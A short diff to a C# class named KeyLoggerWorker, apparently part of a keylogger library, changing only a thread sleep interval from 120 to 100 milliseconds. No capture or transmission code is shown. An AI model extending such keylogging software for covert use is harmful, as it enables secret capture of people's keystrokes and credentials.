@@ -11,7 +11,7 @@ namespace KeyLogger.Library.Worker
 {
     public class KeyLoggerWorker
     {
-        private const int SLEEP_TIME = 120; //120 miliseconds
+        private const int SLEEP_TIME = 100; //100 miliseconds
 
         // This method will be called when the thread is started. 
         public void DoWork(object appender)
